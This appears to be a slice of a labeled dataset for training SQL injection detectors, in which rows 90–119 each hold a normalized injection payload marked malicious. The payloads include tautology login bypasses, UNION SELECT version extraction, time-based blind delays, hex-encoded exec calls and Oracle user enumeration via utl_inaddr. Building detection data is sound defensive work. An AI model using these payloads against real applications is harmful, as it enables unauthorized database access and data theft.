row_index,payload_norm,label,sqli_type_hint
90,1 and user_name ( ) = 'dbo',1,
91,"; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --",1,
92,"select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1",1,
93,"select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1",1,
94,select * from users where id = '1' *$ . or 1 = 1 -- 1',1,
95,select * from users where id = 1 +$+. or 1 = 1 -- 1,1,
96,select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1,1,
97,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,
98,or 1 = 1 or '' = ',1,
99,select * from users where id = 1 or 1 = 1 -- 1,1,
100,or 'text' > 't',1,
101,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,
102,"select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1,
103,"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1",1,
104,admin' or '1' = '1'#,1,
105,select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1,
106,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,
107,select * from information_schema.tables--,1,
108,"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1,
109,1 ) ) or pg_sleep ( __TIME__ ) --,1,
110,"select * from users where id = '1' union select !<@,version ( ) -- 1'",1,
111,declare @q nvarchar ( 200 ) select @q = 0x770061 ...,1,
112,select * from users where id = 1 %!<1 or 1 = 1 -- 1,1,
113,declare @q nvarchar ( 200 ) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),1,
114,"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1,
115,"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1,
116,or 'unusual' = 'unusual',1,
117,or 1 in ( select @@version ) --,1,
118,truncate,1,
119, or 3 = 3 --,1,
